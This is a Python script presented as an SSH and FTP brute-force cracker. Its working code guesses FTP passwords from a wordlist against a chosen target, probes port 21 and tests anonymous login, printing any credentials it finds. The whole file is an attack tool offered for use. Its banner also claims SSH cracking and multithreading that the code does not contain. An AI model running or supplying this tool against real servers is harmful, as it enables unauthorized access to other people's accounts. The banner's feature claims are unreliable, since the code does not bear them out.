#!/usr/bin/python3
from ftplib import FTP
import socket, argparse

def main():
    print("""___________                         _____                    
\_   _____/__________   ____  _____/ ____\_ __  ______ ____  
 |    __)/  _ \_  __ \_/ ___\/ __ \   __\  |  \/  ___// __ \ 
 |     \(  <_> )  | \/\  \__\  ___/|  | |  |  /\___ \\  ___/ 
 \___  / \____/|__|    \___  >___  >__| |____//____  >\___  >
     \/                    \/    \/                \/     \/

---------------------------------------------------------
|      A Python SSH and FTP brute force tool by         |
---------------------------------------------------------

Choose your target:

[1] Crack SSH
      - Bruteforce SSH logins using a customizable wordlist.
      - Supports multiple threads for faster cracking.
      
[2] Crack FTP
      - Bruteforce FTP logins with your chosen dictionary.
      - Includes anonymous login bypass checks.

---------------------------------------------------------
Select an option by entering the corresponding number:
""")
    
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", type=str, dest="target", help="--target ip", default=None)
    parser.add_argument("-w", type=str, dest="wordlist", help="--wordlist", default=None)
    parser.add_argument("-u", type=str, dest="username", help='--username', default=None)
    parser.add_argument("-c", type=str, dest="check", help="--check", default=None)
    parser.add_argument("-a", type=str, dest="anon", help="--anonymous", default=None)
    
    args = parser.parse_args()

    target = args.target
    username = args.username
    wordlist = args.wordlist
    check = args.check
    anon = args.anon

    if anon:
        Anon_login(anon)
    elif target and username and wordlist:
        Brute_force(target, username, wordlist)
    elif check:
        Port_21(check)
    else:
        print("[-] Not a valid option, please refer to -h for help")
  
def Anon_login(target):
    print("[*] Trying anonymous login...")
    try:
        ftp = FTP(target)
        ftp.login()
        ftp.quit()
        print("[+] Server has accepted anonymous login!")
    except:
        print("[-] Server does not accept anonymous login")

def Port_21(check):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    port = s.connect_ex((check, 21))
    if port == 0:
        s.close()
        print("[+] Port 21 is open")
    else:
        s.close()
        print("[-] Port 21 is not open")

def Brute_force(target, username, wordlist):
    with open(wordlist, "r") as wordlist:
        word = wordlist.readline().strip()
        while word:
            Login_ftp(target, username, word)
            word = wordlist.readline().strip()

def Login_ftp(target, username, word):
    print("[*] Brute force is trying the password: " + word)
    ftp_session = FTP(target)
    try:
        ftp_session.login(username, word)
        ftp_session.quit()
        print("[+] Brute force is finished")
        print("[+] Username: " + username)
        print("[+] Password: " + word)
    except:
        ftp_session.quit()
        print("[-] Password failed")

main()
print("[*] The FTP brute tool has finished!")
